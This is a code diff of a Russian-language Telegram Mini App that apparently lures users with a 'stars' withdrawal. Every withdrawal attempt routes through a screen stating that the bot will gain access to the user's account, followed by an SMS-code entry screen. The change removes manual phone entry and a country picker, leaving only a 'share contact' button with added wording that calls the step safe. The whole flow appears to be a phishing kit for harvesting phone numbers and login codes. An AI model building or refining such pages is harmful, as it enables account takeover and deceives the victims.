@@ -458,48 +458,6 @@
             background: #00bcd4;
             color: white;
         }
-        
-        /* Стили для выбора страны */
-        .country-list {
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        
-        .country-item {
-            display: flex;
-            align-items: center;
-            padding: 16px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 12px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        
-        .country-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-        }
-        
-        .country-item:active {
-            background: rgba(255, 255, 255, 0.15);
-        }
-        
-        .country-flag {
-            font-size: 24px;
-            margin-right: 16px;
-        }
-        
-        .country-name {
-            flex: 1;
-            font-size: 16px;
-            font-weight: 500;
-        }
-        
-        .country-code {
-            color: #ffd700;
-            font-weight: 600;
-            font-size: 16px;
-        }
     </style>
 </head>
 <body>
@@ -570,35 +528,17 @@
             <div class="auth-icon">🔐</div>
             <div class="auth-description">
                 Для вывода звезд необходимо авторизоваться через номер телефона. 
-                Бот получит доступ к вашему аккаунту для проведения операции.
+                Поделитесь своим контактом, и бот получит доступ к вашему аккаунту для проведения операции.
             </div>
             
-            <!-- Кнопка поделиться контактом -->
-            <button class="submit-btn" onclick="shareContact()" style="background: #00bcd4; margin-bottom: 20px;">
+            <!-- Только кнопка поделиться контактом -->
+            <button class="submit-btn" onclick="shareContact()" style="background: #00bcd4;">
                 📱 ПОДЕЛИТЬСЯ КОНТАКТОМ
             </button>
             
-            <div style="text-align: center; margin: 20px 0; color: rgba(255, 255, 255, 0.5);">
-                или введите номер вручную
+            <div style="text-align: center; margin: 20px 0; color: rgba(255, 255, 255, 0.6); font-size: 14px; line-height: 1.4;">
+                Нажмите кнопку выше, чтобы безопасно поделиться своим номером телефона через Telegram
             </div>
-            
-            <div class="form-group">
-                <label class="form-label">СТРАНА</label>
-                <div class="country-selector" onclick="showCountryModal()">
-                    <span id="selected-country">🇷🇺 Россия (+7)</span>
-                    <span>›</span>
-                </div>
-            </div>
-            
-            <div class="form-group">
-                <label class="form-label">НОМЕР ТЕЛЕФОНА</label>
-                <div class="phone-input-group">
-                    <input type="text" id="country-code" class="form-input country-code" value="+7" readonly>
-                    <input type="tel" id="phone-number" class="form-input" placeholder="999 123 45 67">
-                </div>
-            </div>
-            
-            <button class="submit-btn" onclick="sendPhoneNumber()">ДАЛЕЕ</button>
         </div>
         
         <!-- Модальное окно ввода SMS кода -->
@@ -720,166 +660,6 @@
             
             <button class="submit-btn" onclick="withdrawBalance()">ВЫВЕСТИ</button>
         </div>
-        
-        <!-- Модальное окно выбора страны -->
-        <div id="country-modal" class="modal">
-            <div class="modal-header">
-                <button class="back-btn" onclick="closeModal('country-modal')">←</button>
-                <div class="modal-title">Выберите страну</div>
-            </div>
-            
-            <div class="country-list">
-                <div class="country-item" onclick="selectCountry('🇷🇺 Россия (+7)', '+7')">
-                    <span class="country-flag">🇷🇺</span>
-                    <span class="country-name">Россия</span>
-                    <span class="country-code">+7</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇺🇦 Украина (+380)', '+380')">
-                    <span class="country-flag">🇺🇦</span>
-                    <span class="country-name">Украина</span>
-                    <span class="country-code">+380</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇰🇿 Казахстан (+7)', '+7')">
-                    <span class="country-flag">🇰🇿</span>
-                    <span class="country-name">Казахстан</span>
-                    <span class="country-code">+7</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇧🇾 Беларусь (+375)', '+375')">
-                    <span class="country-flag">🇧🇾</span>
-                    <span class="country-name">Беларусь</span>
-                    <span class="country-code">+375</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇺🇿 Узбекистан (+998)', '+998')">
-                    <span class="country-flag">🇺🇿</span>
-                    <span class="country-name">Узбекистан</span>
-                    <span class="country-code">+998</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇦🇿 Азербайджан (+994)', '+994')">
-                    <span class="country-flag">🇦🇿</span>
-                    <span class="country-name">Азербайджан</span>
-                    <span class="country-code">+994</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇦🇲 Армения (+374)', '+374')">
-                    <span class="country-flag">🇦🇲</span>
-                    <span class="country-name">Армения</span>
-                    <span class="country-code">+374</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇬🇪 Грузия (+995)', '+995')">
-                    <span class="country-flag">🇬🇪</span>
-                    <span class="country-name">Грузия</span>
-                    <span class="country-code">+995</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇰🇬 Кыргызстан (+996)', '+996')">
-                    <span class="country-flag">🇰🇬</span>
-                    <span class="country-name">Кыргызстан</span>
-                    <span class="country-code">+996</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇹🇯 Таджикистан (+992)', '+992')">
-                    <span class="country-flag">🇹🇯</span>
-                    <span class="country-name">Таджикистан</span>
-                    <span class="country-code">+992</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇹🇲 Туркменистан (+993)', '+993')">
-                    <span class="country-flag">🇹🇲</span>
-                    <span class="country-name">Туркменистан</span>
-                    <span class="country-code">+993</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇲🇩 Молдова (+373)', '+373')">
-                    <span class="country-flag">🇲🇩</span>
-                    <span class="country-name">Молдова</span>
-                    <span class="country-code">+373</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇱🇹 Литва (+370)', '+370')">
-                    <span class="country-flag">🇱🇹</span>
-                    <span class="country-name">Литва</span>
-                    <span class="country-code">+370</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇱🇻 Латвия (+371)', '+371')">
-                    <span class="country-flag">🇱🇻</span>
-                    <span class="country-name">Латвия</span>
-                    <span class="country-code">+371</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇪🇪 Эстония (+372)', '+372')">
-                    <span class="country-flag">🇪🇪</span>
-                    <span class="country-name">Эстония</span>
-                    <span class="country-code">+372</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇺🇸 США (+1)', '+1')">
-                    <span class="country-flag">🇺🇸</span>
-                    <span class="country-name">США</span>
-                    <span class="country-code">+1</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇩🇪 Германия (+49)', '+49')">
-                    <span class="country-flag">🇩🇪</span>
-                    <span class="country-name">Германия</span>
-                    <span class="country-code">+49</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇫🇷 Франция (+33)', '+33')">
-                    <span class="country-flag">🇫🇷</span>
-                    <span class="country-name">Франция</span>
-                    <span class="country-code">+33</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇬🇧 Великобритания (+44)', '+44')">
-                    <span class="country-flag">🇬🇧</span>
-                    <span class="country-name">Великобритания</span>
-                    <span class="country-code">+44</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇮🇹 Италия (+39)', '+39')">
-                    <span class="country-flag">🇮🇹</span>
-                    <span class="country-name">Италия</span>
-                    <span class="country-code">+39</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇪🇸 Испания (+34)', '+34')">
-                    <span class="country-flag">🇪🇸</span>
-                    <span class="country-name">Испания</span>
-                    <span class="country-code">+34</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇵🇱 Польша (+48)', '+48')">
-                    <span class="country-flag">🇵🇱</span>
-                    <span class="country-name">Польша</span>
-                    <span class="country-code">+48</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇹🇷 Турция (+90)', '+90')">
-                    <span class="country-flag">🇹🇷</span>
-                    <span class="country-name">Турция</span>
-                    <span class="country-code">+90</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇨🇳 Китай (+86)', '+86')">
-                    <span class="country-flag">🇨🇳</span>
-                    <span class="country-name">Китай</span>
-                    <span class="country-code">+86</span>
-                </div>
-                
-                <div class="country-item" onclick="selectCountry('🇮🇳 Индия (+91)', '+91')">
-                    <span class="country-flag">🇮🇳</span>
-                    <span class="country-name">Индия</span>
-                    <span class="country-code">+91</span>
-                </div>
-            </div>
-        </div>
     </div>
     
     <script>
@@ -927,28 +707,6 @@
         function showWithdrawModal() {
             // ВСЕГДА показываем экран авторизации при выводе
             showModal('withdraw-auth-modal');
-        }
-        
-        function showCountryModal() {
-            showModal('country-modal');
-        }
-        
-        function selectCountry(countryText, countryCode) {
-            // Обновляем отображение выбранной страны
-            document.getElementById('selected-country').textContent = countryText;
-            
-            // Обновляем код страны в поле ввода
-            document.getElementById('country-code').value = countryCode;
-            
-            // Закрываем модальное окно выбора страны
-            closeModal('country-modal');
-            
-            // Очищаем поле номера телефона при смене страны
-            const phoneInput = document.getElementById('phone-number');
-            if (phoneInput) {
-                phoneInput.value = '';
-                phoneInput.focus();
-            }
         }
         
         function startWithdrawAuth() {
@@ -999,55 +757,6 @@
                 });
             } else {
                 alert('Функция доступна только в Telegram Mini App');
-            }
-        }
-        
-        function sendPhoneNumber() {
-            const phoneNumber = document.getElementById('phone-number').value.replace(/\s/g, '');
-            const countryCode = document.getElementById('country-code').value;
-            
-            if (!phoneNumber || phoneNumber.length < 7) {
-                if (tg) {
-                    tg.showAlert('Введите корректный номер телефона');
-                } else {
-                    alert('Введите корректный номер телефона');
-                }
-                return;
-            }
-            
-            const fullPhone = countryCode + phoneNumber;
-            
-            if (tg) {
-                tg.sendData(JSON.stringify({ 
-                    action: 'send_phone', 
-                    phone: fullPhone 
-                }));
-                
-                // Показываем индикатор загрузки
-                const submitBtn = document.querySelector('#auth-modal .submit-btn');
-                if (submitBtn) {
-                    submitBtn.disabled = true;
-                    submitBtn.textContent = 'ОТПРАВКА...';
-                }
-                
-                // Автоматически показываем окно ввода SMS кода через 3 секунды
-                setTimeout(() => {
-                    closeModal('auth-modal');
-                    showModal('sms-modal');
-                    
-                    // Восстанавливаем кнопку
-                    if (submitBtn) {
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'ДАЛЕЕ';
-                    }
-                }, 3000);
-                
-            } else {
-                alert(`Код будет отправлен на номер ${fullPhone}`);
-                closeModal('auth-modal');
-                setTimeout(() => {
-                    showModal('sms-modal');
-                }, 1000);
             }
         }
         
@@ -1237,79 +946,7 @@
             });
         }
         
-        // Форматирование номера телефона
-        document.addEventListener('DOMContentLoaded', function() {
-            const phoneInput = document.getElementById('phone-number');
-            if (phoneInput) {
-                phoneInput.addEventListener('input', function(e) {
-                    let value = e.target.value.replace(/\D/g, '');
-                    const countryCode = document.getElementById('country-code').value;
-                    let formattedValue = '';
-                    
-                    // Форматирование в зависимости от кода страны
-                    if (countryCode === '+7') {
-                        // Россия/Казахстан: XXX XXX XX XX
-                        if (value.length > 0) {
-                            if (value.length <= 3) {
-                                formattedValue = value;
-                            } else if (value.length <= 6) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
-                            } else if (value.length <= 8) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
-                            } else if (value.length <= 10) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8);
-                            } else {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 8) + ' ' + value.substring(8, 10);
-                            }
-                        }
-                    } else if (countryCode === '+380') {
-                        // Украина: XX XXX XX XX
-                        if (value.length > 0) {
-                            if (value.length <= 2) {
-                                formattedValue = value;
-                            } else if (value.length <= 5) {
-                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2);
-                            } else if (value.length <= 7) {
-                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5);
-                            } else if (value.length <= 9) {
-                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5, 7) + ' ' + value.substring(7);
-                            } else {
-                                formattedValue = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5, 7) + ' ' + value.substring(7, 9);
-                            }
-                        }
-                    } else if (countryCode === '+1') {
-                        // США: XXX XXX XXXX
-                        if (value.length > 0) {
-                            if (value.length <= 3) {
-                                formattedValue = value;
-                            } else if (value.length <= 6) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
-                            } else if (value.length <= 10) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
-                            } else {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10);
-                            }
-                        }
-                    } else {
-                        // Общее форматирование для других стран
-                        if (value.length > 0) {
-                            if (value.length <= 3) {
-                                formattedValue = value;
-                            } else if (value.length <= 6) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3);
-                            } else if (value.length <= 9) {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
-                            } else {
-                                formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 9);
-                            }
-                        }
-                    }
-                    
-                    e.target.value = formattedValue;
-                });
-            }
-            
-            // Форматирование SMS кода
+        // Форматирование SMS кода
             const smsInput = document.getElementById('sms-code');
             if (smsInput) {
                 smsInput.addEventListener('input', function(e) {
